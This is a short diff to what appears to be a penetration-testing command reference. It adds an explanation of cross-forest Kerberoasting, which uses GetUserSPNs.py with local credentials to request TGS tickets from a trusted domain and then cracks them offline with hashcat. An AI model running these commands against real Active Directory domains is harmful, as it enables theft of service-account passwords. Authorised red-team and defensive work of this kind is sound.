@@ -103,5 +103,6 @@
       "label": "Crack offline",
       "command": "hashcat -m 13100 xf.txt /usr/share/wordlists/rockyou.txt"
     }
-  ]
+  ],
+  "explain": "Kerberoasts a trusted foreign forest using your local-forest credentials:\n  GetUserSPNs.py           request TGS tickets for SPN accounts\n  -request                 actually request the tickets (not just list)\n  -target-domain <foreign_domain>   the trusted domain whose service accounts you roast\n  <domain>/<user>:<password>   your local-forest credentials\nWith a bidirectional trust the foreign DC issues TGS tickets encrypted with the foreign account's key; crack them offline (hashcat -m 13100)."
 }
